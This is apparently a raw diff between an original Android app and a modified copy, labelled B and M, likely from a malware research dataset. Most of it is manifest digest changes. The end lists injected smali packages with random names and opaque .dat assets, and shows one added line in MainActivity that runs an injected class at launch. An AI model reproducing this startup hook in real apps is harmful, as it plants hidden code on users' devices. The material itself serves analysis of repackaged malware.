+< SHA1-Digest: bQ/t9/FGwUqYjbWZ+Xs/tFfjXUk=
+< 
+< Name: res/raw/phonegap.js
+< SHA1-Digest: gxRaBo2QG88CBAOYyYi1MQRCqd4=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_hebrew.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: res/drawable/installing_spinner_5.png
+< SHA1-Digest: 6BBBJswOBsNTAbCNF6sQGHUZ+GQ=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_russian.txt
+< SHA1-Digest: lulM+eX+omlYPVagYcZ7S+1OOAg=
+< 
+< Name: res/drawable/retrieving_data.png
+< SHA1-Digest: 949hOB9Czj2LWOGp0kTHC06kISs=
+< 
+< Name: res/raw/appmobi_android.js
+< SHA1-Digest: TiePOoOFpI6jTFKIP53fmypSEZc=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_approx_any.txt
+< SHA1-Digest: 0mWytx3QfDcxQYesfSLfKaaiPGc=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_greek.txt
+< SHA1-Digest: ZK+AVLklo2cJUK6apOygqti1wRM=
+< 
+< Name: res/drawable/spinner_e.png
+< SHA1-Digest: D02y6NS0OX/wFIvWhuC3f1EhH/M=
+< 
+< Name: assets/DirectCanvasSupport/ImpactPlugins/dbox2d/lib.js
+< SHA1-Digest: UgZKnL4paVyhajjL3eXmybdXhMQ=
+< 
+< Name: res/drawable/loading.png
+< SHA1-Digest: gCrlwIvI6L6dYB3rKtLR2HUSKjM=
+< 
+< Name: res/layout/encode.xml
+< SHA1-Digest: 3SMruxO9nOI0JvkJbxl7rrb0GFg=
+< 
+< Name: res/layout/search_book_contents_header.xml
+< SHA1-Digest: mrKt9O1QzJ9k701g/GvbSXDa6A8=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_exact_hebrew.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_greek.txt
+< SHA1-Digest: /j/A9h8+FfAazMODJJHekOCQB5c=
+< 
+< Name: res/drawable-hdpi/close.png
+< SHA1-Digest: P3HE/cN1DH97qEFhaWUqiBLjuUY=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_exact_italian.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: res/drawable/picture_frame.png
+< SHA1-Digest: N/svgBhubEDO4AwvWadbiMGsVRM=
+< 
+< Name: res/layout/search_book_contents_list_item.xml
+< SHA1-Digest: knTDoYZH5tEPmhnl2mcubpRRhfQ=
+< 
+< Name: assets/DirectCanvasSupport/ImpactPlugins/dbox2d/game.js
+< SHA1-Digest: u4SzAeI3xnfRn5nACQuBdFoZQSw=
+< 
+< Name: res/drawable/player_bg_ls.png
+< SHA1-Digest: oDDe0huqvdmrPXyyT9ZnexBeBrM=
+< 
+< Name: res/layout/help.xml
+< SHA1-Digest: nBsV8kb657kgf8DiNUq9l3vFLyQ=
+< 
+< Name: res/layout/main_hvga_l.xml
+< SHA1-Digest: zkxvLTdzXQV906xcltxoWApOnoU=
+< 
+< Name: res/raw/appmobi_android_400.js
+< SHA1-Digest: TiePOoOFpI6jTFKIP53fmypSEZc=
+< 
+< Name: assets/DirectCanvasSupport/ImpactPlugins/dc/loader.js
+< SHA1-Digest: Nx/aRfCAbtZW2b8X1qHTBKMA+AU=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_rules_any.txt
+< SHA1-Digest: dLYj+QzWWMV1HWCtEJPX4xYg2q0=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_exact_russian.txt
+< SHA1-Digest: rXaMJ4HIP1dVq2JA4YDx9goSHNo=
+< 
+< Name: res/drawable/spinner_n.png
+< SHA1-Digest: YnAznoLyx/VtwIjqYijmIUAr/Ws=
+< 
+< Name: res/drawable-xhdpi/splash_screen_tablet.jpg
+< SHA1-Digest: 438Y4FCOtFo0LO6piIrhsVe4v3M=
+< 
+< Name: res/raw/testpgjs.html
+< SHA1-Digest: PvQnuAaRFjMX2OlasdLmQ36ghMg=
+< 
+< Name: res/drawable/button_allow.png
+< SHA1-Digest: fvxtIHoGfaFaYZ1sn9qD+SFoo0A=
+< 
+< Name: res/layout/search_book_contents.xml
+< SHA1-Digest: mCDq1gQ9JWwWDtFrYzvtX3ju1EQ=
+< 
+< Name: res/layout/splash_tablet.xml
+< SHA1-Digest: Xw+i+xoDdKLSflJU+ezEj9Cknsc=
+< 
+< Name: res/drawable-xhdpi/close.png
+< SHA1-Digest: 0IaTuYpHdwNgyn8PrCfM4P1LSUM=
+< 
+< Name: org/apache/commons/codec/language/bm/lang.txt
+< SHA1-Digest: H+gJtZUsHsM9QHoCyS/cdT9yjaQ=
+< 
+< Name: res/drawable-hdpi/icon.png
+< SHA1-Digest: 7k0R15Eowd7viwJeIN6gaJ1z0j0=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_approx_french.txt
+< SHA1-Digest: q9sgIysKftSjudOa4wXU3BLc/4Y=
+< 
+< Name: res/drawable-ldpi/facebook_icon.png
+< SHA1-Digest: lPHIYoqZ+2OpY0LPumyDkUdNdoc=
+< 
+< Name: assembly-descriptor.xml
+< SHA1-Digest: 1S+kj47zhHaLAfkRSEqWJ4uOaCs=
+< 
+< Name: res/layout/list_item.xml
+< SHA1-Digest: ZGIRrZc2E+fA2zCsWIRM6ijjsPk=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_approx_hebrew.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_czech.txt
+< SHA1-Digest: 00E7VR452tbgGSDvaN2vH71JXd0=
+< 
+< Name: res/layout-ldpi/capture.xml
+< SHA1-Digest: VR55lPAkFNQoN/HbINw+3zKQEMM=
+< 
+< Name: res/drawable-hdpi/facebook_icon.png
+< SHA1-Digest: V2LEVKYg2PFb0nYYOBnKjQliS/s=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_romanian.txt
+< SHA1-Digest: 9XU05+EK41PC/HwRw9zxny5awCw=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_portuguese.txt
+< SHA1-Digest: 2tGtdUrB2oruPbgFAC1SD4R2Mn0=
+< 
+< Name: res/drawable/rich_splash_port.png
+< SHA1-Digest: sEg3T25xyAD7ru7hq0KHahYuxsM=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_portuguese.txt
+< SHA1-Digest: ZK+AVLklo2cJUK6apOygqti1wRM=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_dutch.txt
+< SHA1-Digest: ubXAOlBgTG6cluGh9Yg9omLd9gY=
+< 
+< Name: assets/DirectCanvasSupport/ImpactPlugins/dc/animation.js
+< SHA1-Digest: aXRABZ1WKZoVtsl4x1SA0AGvuck=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_approx_common.txt
+< SHA1-Digest: padRPYJ0BaElGjLugFZoVeiaNRQ=
+< 
+470c77,80
+< SHA1-Digest: IXHQAyktXNvH29vYaAE+Fqvr6aM=
+---
+> SHA1-Digest: iHjb+Jfq0Rz14FL7xvkUC39nojY=
+> 
+> Name: res/drawable/service_notification.png
+> SHA1-Digest: TLZDf/EiHJL/5TukUG1wnhY6iDw=
+478,489d87
+< Name: org/apache/commons/codec/language/bm/sep_exact_spanish.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_german.txt
+< SHA1-Digest: ASWiPOCybslDsqdqSYrJCczwNBA=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_hebrew_common.txt
+< SHA1-Digest: U+3sGtHvTz+ZqpSe1f7MYHB2TsQ=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_romanian.txt
+< SHA1-Digest: h57+YZWPX1cnEcSdoXhfGLuta3s=
+< 
+492a91,93
+> Name: res/layout-land/encode.xml
+> SHA1-Digest: R36DZ5w7ByTira0TnOitQ2FSbMg=
+> 
+499,503c100,101
+< Name: res/layout-land/encode.xml
+< SHA1-Digest: JBryPrv+xjoX+ycz7XuxbBLTxAg=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_dutch.txt
+< SHA1-Digest: ZK+AVLklo2cJUK6apOygqti1wRM=
+---
+> Name: res/layout/login.xml
+> SHA1-Digest: 3MB9KOv1vuaeVAGJzg82D5RSiwY=
+505,506c103,104
+< Name: org/apache/commons/codec/language/bm/sep_approx_french.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+---
+> Name: res/drawable-xhdpi/test_container_splash_screen_tablet.jpg
+> SHA1-Digest: tCthugYHsZrJAkT3G14Tr++wNcY=
+508,509c106,107
+< Name: org/apache/commons/codec/language/bm/sep_approx_italian.txt
+< SHA1-Digest: sQ1CrX8M+aYXtqb+FaAQJlodnx0=
+---
+> Name: res/raw/canvas.js
+> SHA1-Digest: RbCZsqTUbW7iGjpWviz98LbNnZA=
+514,515c112,116
+< Name: org/apache/commons/codec/language/bm/sep_exact_common.txt
+< SHA1-Digest: yMn8iqUiPF5RM7J9xhj6gb3A6E4=
+---
+> Name: res/drawable/button_allow_press.png
+> SHA1-Digest: ko8x+f3Gw+sux/SUVyTO4xIOGlI=
+> 
+> Name: res/drawable/am_qr_reader_logo.png
+> SHA1-Digest: lxqILMTEYVEMBlIVxbDsTibE1LY=
+522a124,126
+> Name: res/raw/box2d.js
+> SHA1-Digest: ffOyAsC8n8bi1LEAGy0rsXn6dzU=
+> 
+528a133,135
+> Name: res/raw/appmobicloud.js
+> SHA1-Digest: ewjHeX1zYkwSY4R3p6FDjGujxTE=
+> 
+531a139,147
+> Name: res/raw/admobimgr.js
+> SHA1-Digest: DXfu2CAUgfDApW05kMdEMg4Qims=
+> 
+> Name: res/layout/main_hvga_p.xml
+> SHA1-Digest: 4DTuVw9Wd9cgmtv/KLqf2UGERnc=
+> 
+> Name: res/drawable/go_back.png
+> SHA1-Digest: kgEE+PzgzmHS3ZuPSaU5wPY+SqA=
+> 
+535,536c151,155
+< Name: org/apache/commons/codec/language/bm/gen_approx_czech.txt
+< SHA1-Digest: ZK+AVLklo2cJUK6apOygqti1wRM=
+---
+> Name: res/drawable/share_via_barcode.png
+> SHA1-Digest: EnsnpDRevp5lBWje24sfD/LpVt0=
+> 
+> Name: res/drawable/rich_splash_ipad_ls.png
+> SHA1-Digest: AHqpojHYZD3ccnu46ipm2hLUiQk=
+538,539c157,158
+< Name: org/apache/commons/codec/language/bm/gen_exact_hebrew.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+---
+> Name: resources.arsc
+> SHA1-Digest: jXfFHCY6F301qdRt7FvzXDfxAtw=
+544,546d162
+< Name: resources.arsc
+< SHA1-Digest: gOpCgR9IGFIAk6iXYE9TrB0mEpU=
+< 
+548c164
+< SHA1-Digest: yY77EbF7JI8HVwA2W4h85Y72OOM=
+---
+> SHA1-Digest: I87xUk2pr11Gu4AyDGe64Tg5UFY=
+552a169,171
+> Name: res/drawable/installing_spinner.xml
+> SHA1-Digest: 5oy3kkDsKKabMLadsBhYx3ZNuyQ=
+> 
+556,558d174
+< Name: res/drawable/installing_spinner.xml
+< SHA1-Digest: d1aqxNjy9POy8KVnr/x+tb84lvU=
+< 
+560c176
+< SHA1-Digest: KzeQOSam9CkwW66Ku4gXYC/nRgc=
+---
+> SHA1-Digest: y7A1FEdmKgwHkKbbsDJJe7KgjDg=
+562,563c178,179
+< Name: org/apache/commons/codec/language/bm/gen_languages.txt
+< SHA1-Digest: Wd+YcHRM0F23bj/qZsPhOjYOa+4=
+---
+> Name: res/layout/test_container_splash_tablet.xml
+> SHA1-Digest: mr6WfCT/Cf/xWDP3lE5+38pMgCg=
+565,566c181,182
+< Name: org/apache/commons/codec/language/bm/sep_rules_spanish.txt
+< SHA1-Digest: uTGxICniFcGE+85pnK+pGH1Xzt8=
+---
+> Name: assets/9.dat
+> SHA1-Digest: zBoPjoLLdPOE2px5zmEHPyurils=
+568,569c184,185
+< Name: org/apache/commons/codec/language/bm/gen_exact_approx_common.txt
+< SHA1-Digest: Hxjkq50d1HJRTfhnGsjVmtUwQ38=
+---
+> Name: res/drawable/spinner_w.png
+> SHA1-Digest: Pp3a2z5Hww2iC0ksC0bAELWIdAM=
+574,582d189
+< Name: org/apache/commons/codec/language/bm/sep_languages.txt
+< SHA1-Digest: N9Nby7yZl/CNB4XLYMOy4NPkDns=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_exact_portuguese.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: res/drawable/timer_button_on.png
+< SHA1-Digest: mzK30zvKCirZDQLjYmtJnqMZTSM=
+< 
+586,587c193,194
+< Name: org/apache/commons/codec/language/bm/gen_approx_french.txt
+< SHA1-Digest: fG8iHIY7dmE+dzMnRN1V8U+CAWs=
+---
+> Name: res/drawable/timer_button_on.png
+> SHA1-Digest: mzK30zvKCirZDQLjYmtJnqMZTSM=
+592,594d198
+< Name: org/apache/commons/codec/language/bm/gen_rules_cyrillic.txt
+< SHA1-Digest: Yg5q1pDwdRE2199a3lBn//aVSZ0=
+< 
+598,602c202,203
+< Name: org/apache/commons/codec/language/bm/ash_rules_hebrew.txt
+< SHA1-Digest: 1d23tX+8Zs6txZql1HQugopK6Dw=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_cyrillic.txt
+< SHA1-Digest: T3Kwm8H/aw/kkF6SaYfagX9J1mw=
+---
+> Name: res/drawable/remote_close.png
+> SHA1-Digest: LIhfHvOpGXsIF4qFRH1vxXCz5wk=
+605c206
+< SHA1-Digest: /BwkgtitpPs60xGVvQro0W/ndaw=
+---
+> SHA1-Digest: Zld8DsiHzj7EaE05y8zojx35qtY=
+611,614c212
+< SHA1-Digest: ALoCrPfyEFKmBfmR+LCjDrpFgso=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_czech.txt
+< SHA1-Digest: iPK8bJaVzSZc5K5rvtJ99cdrL3g=
+---
+> SHA1-Digest: IVZ8PA92hdnoLeJEIfMOBvQ8sIg=
+616,620c214,215
+< Name: org/apache/commons/codec/language/bm/gen_approx_turkish.txt
+< SHA1-Digest: ZK+AVLklo2cJUK6apOygqti1wRM=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_rules_spanish.txt
+< SHA1-Digest: jxaPlVZm4rC0Egc7UWeCEFaLVsQ=
+---
+> Name: res/raw/bookmarks.xml
+> SHA1-Digest: 0h9LouZMX8UVIzdSfBdFTzDolls=
+628,629c223,224
+< Name: org/apache/commons/codec/language/bm/ash_exact_spanish.txt
+< SHA1-Digest: QN+UL/Br/fToWzAZVM6R8yBU8uA=
+---
+> Name: res/drawable-ldpi/close.png
+> SHA1-Digest: lg0izCnB1flsd2QqLisbxkcuGyU=
+637,639d231
+< Name: org/apache/commons/codec/language/bm/ash_rules_french.txt
+< SHA1-Digest: o5S4BN9+movhRfKv/CPmwVWMk0s=
+< 
+644c236,239
+< SHA1-Digest: kBL26KTpnA/zi7c83qotiVaIW4U=
+---
+> SHA1-Digest: skwRBjQdGEZPSSX/kMBJl65mErY=
+> 
+> Name: res/layout/test_container_splash.xml
+> SHA1-Digest: toIIZxtYRa9NtjH6ZjVHV+O9n5s=
+649,650c244,245
+< Name: org/apache/commons/codec/language/bm/gen_approx_common.txt
+< SHA1-Digest: LdAHq1Uf7ZJObFLplHkMBg62o8g=
+---
+> Name: res/layout/payment.xml
+> SHA1-Digest: EyeC9o5vROqv4uviuSuTpaiBac8=
+655,657d249
+< Name: org/apache/commons/codec/language/bm/gen_rules_greeklatin.txt
+< SHA1-Digest: epTnnPkJV3kP2U6NeMgMH2hMESs=
+< 
+660a253,258
+> Name: res/raw/paybundle.zip
+> SHA1-Digest: ScDtAxN0hvnydIDvVFCySIzqVhw=
+> 
+> Name: res/layout/network.xml
+> SHA1-Digest: rKfstcIX8KCS+rNBOXXb3/U/T/g=
+> 
+664,668c262,263
+< Name: org/apache/commons/codec/language/bm/ash_approx_hungarian.txt
+< SHA1-Digest: 604dJC1I4/8Oy3q/B/iDaSTWh7Y=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_any.txt
+< SHA1-Digest: s7KvcfwD+yZtsux5sF8HC7SSwKw=
+---
+> Name: res/drawable/installing_spinner_7.png
+> SHA1-Digest: AL05aGoV7MTZ2k1TVnbc7ARtGhs=
+673,674c268,269
+< Name: org/apache/commons/codec/language/bm/sep_exact_any.txt
+< SHA1-Digest: vokBnqDrzgh7ubmg4N5ltqYJsgY=
+---
+> Name: res/drawable-xhdpi/launch_icon.png
+> SHA1-Digest: rqrmpS530IRsMsYyDgCUaTOJsC8=
+677c272
+< SHA1-Digest: pebwmido1fdamiLJNqZb5v3xaH4=
+---
+> SHA1-Digest: zcy9iGWsveq5yZZdiI0lMqnoHsk=
+682,683c277,278
+< Name: org/apache/commons/codec/language/bm/sep_approx_portuguese.txt
+< SHA1-Digest: wGpv/4nTHPd+c4HkTvDnN2PUYOU=
+---
+> Name: res/layout/oauth_verification.xml
+> SHA1-Digest: LWpt8xV2AO9F7pzo6mXoK3jy9h8=
+685,686c280,281
+< Name: org/apache/commons/codec/language/bm/gen_exact_portuguese.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+---
+> Name: res/drawable-mdpi/icon.png
+> SHA1-Digest: Lw/SqxqQxDgeX1jWQ7pEzoJ873E=
+688,689c283,287
+< Name: res/layout/oauth_verification.xml
+< SHA1-Digest: 6HH3Bz5xs5b7agXgDDzsmaDjmME=
+---
+> Name: res/drawable/fav_button.png
+> SHA1-Digest: PDdHLEGY3KKqD0vtYqdQLsCwXws=
+> 
+> Name: assets/jawz/jso.dat
+> SHA1-Digest: D2/j/Fxc6lk8tuQXgMttSFQRsZw=
+694,698c292,293
+< Name: org/apache/commons/codec/language/bm/ash_rules_hungarian.txt
+< SHA1-Digest: KxrQuSBewEePK/XN5khH0PWw7yE=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_french.txt
+< SHA1-Digest: CrDzmQQb/nDj6G9KGuej8e+uHIU=
+---
+> Name: assets/DirectCanvasSupport/ImpactPlugins/dc/background-map.js
+> SHA1-Digest: 3sCpun7EWMx2NhMwchHHKbUlWX4=
+703,704c298,299
+< Name: org/apache/commons/codec/language/bm/gen_rules_italian.txt
+< SHA1-Digest: fpEQsllQFifzCfJ/dp1xEwvBVdg=
+---
+> Name: res/drawable/play_button.png
+> SHA1-Digest: RXs6+/4UWii1ErpeVDU/+PinBII=
+709,710c304,305
+< Name: org/apache/commons/codec/language/bm/ash_exact_hungarian.txt
+< SHA1-Digest: QN+UL/Br/fToWzAZVM6R8yBU8uA=
+---
+> Name: res/drawable/rich_splash_ls.png
+> SHA1-Digest: 1+78HbiiLs8JyRK9X7cTSMtv47g=
+714a310,315
+> Name: res/layout/bookmark_picker_list_item.xml
+> SHA1-Digest: 2hbWgP1jhMrB2gw5smqkLr6UFWI=
+> 
+> Name: res/raw/onetouch_access_bg.jpg
+> SHA1-Digest: lHD6hYaCeSs85KlTkFQJ09WQWD0=
+> 
+721,722c322,326
+< Name: org/apache/commons/codec/language/bm/gen_exact_romanian.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+---
+> Name: res/raw/bundle.zip
+> SHA1-Digest: tF4MRR01OyVpmT2a01cMIizN4NY=
+> 
+> Name: res/drawable/timer_button.png
+> SHA1-Digest: zEUqVdofotdoudiHxgxbO116lrc=
+725c329
+< SHA1-Digest: BeygeAZbgenMIBjhusqQM45DRl0=
+---
+> SHA1-Digest: cj2o+pnjOg22SCxs70iEH9XicAo=
+727,728c331,335
+< Name: org/apache/commons/codec/language/bm/ash_exact_romanian.txt
+< SHA1-Digest: QN+UL/Br/fToWzAZVM6R8yBU8uA=
+---
+> Name: res/drawable/installing_spinner_4.png
+> SHA1-Digest: 93bJObTQFkz2lnEmuBAtHgS+BIk=
+> 
+> Name: res/raw/phonegap.js
+> SHA1-Digest: gxRaBo2QG88CBAOYyYi1MQRCqd4=
+733,734c340,344
+< Name: org/apache/commons/codec/language/bm/gen_exact_cyrillic.txt
+< SHA1-Digest: 00E7VR452tbgGSDvaN2vH71JXd0=
+---
+> Name: res/drawable/installing_spinner_5.png
+> SHA1-Digest: 6BBBJswOBsNTAbCNF6sQGHUZ+GQ=
+> 
+> Name: res/raw/appmobi_android.js
+> SHA1-Digest: TiePOoOFpI6jTFKIP53fmypSEZc=
+736,737c346,350
+< Name: org/apache/commons/codec/language/bm/ash_hebrew_common.txt
+< SHA1-Digest: lhqN1L0rc6oqNcToAM5w5eXc69k=
+---
+> Name: res/drawable/retrieving_data.png
+> SHA1-Digest: 949hOB9Czj2LWOGp0kTHC06kISs=
+> 
+> Name: res/drawable/spinner_e.png
+> SHA1-Digest: D02y6NS0OX/wFIvWhuC3f1EhH/M=
+742,743c355,356
+< Name: org/apache/commons/codec/language/bm/sep_rules_italian.txt
+< SHA1-Digest: 4OtvhiYVCX6Pngy4UP1SKrIDoro=
+---
+> Name: assets/DirectCanvasSupport/ImpactPlugins/dbox2d/lib.js
+> SHA1-Digest: UgZKnL4paVyhajjL3eXmybdXhMQ=
+745,746c358,359
+< Name: org/apache/commons/codec/language/bm/gen_approx_italian.txt
+< SHA1-Digest: kpJ0pEDOyFBEu6wl4QdynsUq6jE=
+---
+> Name: res/drawable/loading.png
+> SHA1-Digest: gCrlwIvI6L6dYB3rKtLR2HUSKjM=
+748,749c361,362
+< Name: res/drawable/onetouch_allow_btn.xml
+< SHA1-Digest: lHlKEGyAQw6PuZA4IH3slXis9DA=
+---
+> Name: res/layout/encode.xml
+> SHA1-Digest: 2kayK8vKLQbcRIOFbDTXLOyqXrI=
+751,752c364,365
+< Name: org/apache/commons/codec/language/bm/gen_exact_hungarian.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+---
+> Name: res/drawable/onetouch_allow_btn.xml
+> SHA1-Digest: g+O2C0mOKwNecNxZQXGXWB4qy+w=
+754,755c367,368
+< Name: org/apache/commons/codec/language/bm/gen_rules_arabic.txt
+< SHA1-Digest: yt4PLY35eX3omtnfi8cYJAdUwDA=
+---
+> Name: res/layout/search_book_contents_header.xml
+> SHA1-Digest: CN41z2y8XJhm+f68KqcmCyWUAQg=
+762a376,381
+> Name: res/drawable-hdpi/close.png
+> SHA1-Digest: P3HE/cN1DH97qEFhaWUqiBLjuUY=
+> 
+> Name: res/drawable/picture_frame.png
+> SHA1-Digest: N/svgBhubEDO4AwvWadbiMGsVRM=
+> 
+766,767c385,395
+< Name: org/apache/commons/codec/language/bm/ash_approx_hebrew.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+---
+> Name: res/layout/search_book_contents_list_item.xml
+> SHA1-Digest: Zg7igscsJYc/KWnNWwKZMyBaUts=
+> 
+> Name: assets/DirectCanvasSupport/ImpactPlugins/dbox2d/game.js
+> SHA1-Digest: u4SzAeI3xnfRn5nACQuBdFoZQSw=
+> 
+> Name: res/drawable/player_bg_ls.png
+> SHA1-Digest: oDDe0huqvdmrPXyyT9ZnexBeBrM=
+> 
+> Name: res/layout/help.xml
+> SHA1-Digest: XW5jELNlDWdV0JlbKohi2Sp0XKU=
+769,770c397,401
+< Name: org/apache/commons/codec/language/bm/ash_rules_cyrillic.txt
+< SHA1-Digest: EsR+HI42mjkQMSRBChc6UJMNHnk=
+---
+> Name: res/layout/main_hvga_l.xml
+> SHA1-Digest: xx3up/6Ig7WAvyWfxVCcsNNuMuM=
+> 
+> Name: res/raw/appmobi_android_400.js
+> SHA1-Digest: TiePOoOFpI6jTFKIP53fmypSEZc=
+775,776c406,407
+< Name: org/apache/commons/codec/language/bm/gen_approx_polish.txt
+< SHA1-Digest: e4PksIbpzRqmyfXiE+gxLVhuVNA=
+---
+> Name: assets/DirectCanvasSupport/ImpactPlugins/dc/loader.js
+> SHA1-Digest: Nx/aRfCAbtZW2b8X1qHTBKMA+AU=
+784,785c415,416
+< Name: org/apache/commons/codec/language/bm/gen_rules_hungarian.txt
+< SHA1-Digest: w312gpWjUSsWx0VAK7N26JpOv3E=
+---
+> Name: res/drawable/spinner_n.png
+> SHA1-Digest: YnAznoLyx/VtwIjqYijmIUAr/Ws=
+790,791c421,422
+< Name: org/apache/commons/codec/language/bm/sep_approx_spanish.txt
+< SHA1-Digest: wGpv/4nTHPd+c4HkTvDnN2PUYOU=
+---
+> Name: assets/topsen/eosw.dat
+> SHA1-Digest: hZm7d/Jx5BPdDqPbDwtXCSeWJL4=
+793,794c424,428
+< Name: org/apache/commons/codec/language/bm/ash_approx_polish.txt
+< SHA1-Digest: d7PswPXB40uZY4D8wXcuG7osFGk=
+---
+> Name: res/drawable-xhdpi/splash_screen_tablet.jpg
+> SHA1-Digest: 438Y4FCOtFo0LO6piIrhsVe4v3M=
+> 
+> Name: res/raw/testpgjs.html
+> SHA1-Digest: PvQnuAaRFjMX2OlasdLmQ36ghMg=
+799,800c433,434
+< Name: org/apache/commons/codec/language/bm/ash_exact_german.txt
+< SHA1-Digest: w4DMVKfl4a7tpge4d91vRsE09Uc=
+---
+> Name: res/drawable/button_allow.png
+> SHA1-Digest: fvxtIHoGfaFaYZ1sn9qD+SFoo0A=
+802,803c436,437
+< Name: org/apache/commons/codec/language/bm/ash_approx_spanish.txt
+< SHA1-Digest: 604dJC1I4/8Oy3q/B/iDaSTWh7Y=
+---
+> Name: res/layout/search_book_contents.xml
+> SHA1-Digest: uHnVu6hoe7y50DGtsNJIffYAaXU=
+805,806c439,443
+< Name: org/apache/commons/codec/language/bm/gen_rules_spanish.txt
+< SHA1-Digest: T+njbAJy1Bqc9+cbiIJMwcI9HrU=
+---
+> Name: res/layout/splash_tablet.xml
+> SHA1-Digest: gdF/UWBhqDi4LDvT906zxdp9GX4=
+> 
+> Name: res/drawable-xhdpi/close.png
+> SHA1-Digest: 0IaTuYpHdwNgyn8PrCfM4P1LSUM=
+811,813d447
+< Name: org/apache/commons/codec/language/bm/gen_exact_common.txt
+< SHA1-Digest: u/mGD68aVPmhFiWBCiQdju9UoVw=
+< 
+817,821c451,452
+< Name: org/apache/commons/codec/language/bm/ash_rules_polish.txt
+< SHA1-Digest: bnV3hR/TM8/nCLUXvfXHWUmvShI=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_arabic.txt
+< SHA1-Digest: 6qj8otnCUSRgzzY1XsPSLprI8l4=
+---
+> Name: res/drawable-hdpi/icon.png
+> SHA1-Digest: 7k0R15Eowd7viwJeIN6gaJ1z0j0=
+Somente em result/APP_101/App_M_101/smali/com: fuonw
+Somente em result/APP_101/App_M_101/smali/com: hunstun
+Somente em result/APP_101/App_M_101/smali/com: luotuy
+diff -r result/APP_101/App_B_101/smali/com/pipelineinteractive/pipeline/firedupdroid8b/MainActivity.smali result/APP_101/App_M_101/smali/com/pipelineinteractive/pipeline/firedupdroid8b/MainActivity.smali
+79a80,81
+>     invoke-static {p0}, Lcom/luotuy/mustn/CoseIsenActivity;->init(Landroid/content/Context;)V
+> 
+Somente em result/APP_101/App_M_101/smali/com: sumase
+Somente em result/APP_101/App_B_101/: unknown
